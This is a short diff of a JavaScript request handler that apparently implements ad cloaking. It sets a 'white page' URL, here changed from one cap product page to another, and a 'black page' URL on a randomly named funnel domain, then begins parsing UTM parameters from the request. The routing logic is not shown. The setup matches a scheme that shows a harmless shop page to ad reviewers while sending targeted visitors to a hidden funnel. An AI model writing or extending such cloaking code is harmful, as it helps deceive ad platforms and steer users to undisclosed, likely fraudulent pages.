@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.ralphlauren.global/pk/en/cotton-chino-ball-cap-643782.html?dwvar643782_colorname=New%20England%20Blue&cgid=men-spring-edit#start=1&cgid=men-spring-edit";
+    const whitePageURL = "https://www.sclothers.com/collections/caps/products/mcp141r";
     const blackPageURL = "https://IFRXJwhbvB.myfunnelish.com/imbassd-1735569734063202-1735754211879216";
   
     // Parse the UTM parameters from the request URL
